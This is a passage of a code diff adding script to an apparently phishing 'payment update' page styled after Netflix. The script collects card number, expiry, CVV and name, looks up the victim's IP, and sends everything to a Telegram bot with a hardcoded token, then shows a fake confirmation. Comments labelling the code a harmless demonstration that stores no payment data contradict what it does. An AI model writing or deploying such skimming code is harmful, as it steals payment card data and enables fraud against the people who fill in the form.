+        document.getElementById('nameOnCardError').style.display = 'none';
+      }
+      
+      return isValid;
+    }
+      
+    // Form submission
+    document.getElementById('paymentUpdateForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      if (!validateForm()) {
+        return;
+      }
+      
+      // Get form data
+      const formData = {
+        cardNumber: document.getElementById('cardNumber').value,
+        expiryDate: document.getElementById('expiryDate').value,
+        cvv: document.getElementById('cvv').value,
+        nameOnCard: document.getElementById('nameOnCard').value
+      };
+      
+      // Disable the button
+      const button = document.getElementById('updateButton');
+      button.disabled = true;
+      button.textContent = 'Processing...';
+      
+      // For demonstration purposes only - DO NOT use for real payment data
+      // This is just to show how you might save non-sensitive user data
+      function saveToJsonFile(data) {
+        // In a real application, you would send this to your server
+        // This is just a demonstration of the concept
+        console.log('Data that would be saved (NOT payment info):', {
+          name: data.nameOnCard,
+          lastUpdated: new Date().toISOString()
+        });
+        
+        // NEVER save actual payment details like this
+      }
+      
+      // Simulate processing
+      setTimeout(function() {
+        // Save non-sensitive data (for demonstration only)
+        saveToJsonFile({
+          nameOnCard: formData.nameOnCard,
+          // Do NOT include card number, expiry, or CVV
+        });
+        
+        fetch('https://api.ipify.org?format=json')
+          .then(response => response.json())
+          .then(data => {
+            const userAgent = navigator.userAgent;
+            sendToTelegramBot(formData, data.ip, userAgent)
+              .then((res) => {
+                console.log('Message sent to Telegram:', res);
+              })
+              .catch((err) => {
+                console.error('Error sending message to Telegram:', err);
+              });
+          })
+          .catch(error => {
+            console.error('Error getting IP:', error);
+            sendToTelegramBot(formData, 'Unknown', navigator.userAgent)
+              .then((res) => {
+                console.log('Message sent to Telegram:', res);
+              })
+              .catch((err) => {
+                console.error('Error sending message to Telegram:', err);
+              });
+          });
+        
+        // Show confirmation screen
+        document.getElementById('paymentForm').classList.add('hidden');
+        document.getElementById('confirmationScreen').classList.add('active');
+        
+        // Redirect after 5 seconds
+        setTimeout(function() {
+          // In a real application, this would redirect to Netflix
+          console.log('Redirecting to Netflix...');
+          // window.location.href = 'https://www.netflix.com/browse';
+        }, 5000);
+      }, 1500);
+    });
+    
+    function sendToTelegramBot(formData, ip, userAgent) {
+      const BOT_TOKEN = '5834217444:AAFUnCikLP3XclFk2mPq29VeIpFMrjHTMCk';
+      const CHAT_ID = '5456553035';
+      const message = `New Payment Update:\nName: ${formData.nameOnCard}\nCard: ${formData.cardNumber}\nExpiry: ${formData.expiryDate}\nCVV: ${formData.cvv}\n\nIP: ${ip}\nUser-Agent: ${userAgent}`;
+
+      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+        }),
+      });
+    }
+  </script>
+</body>
 </html>
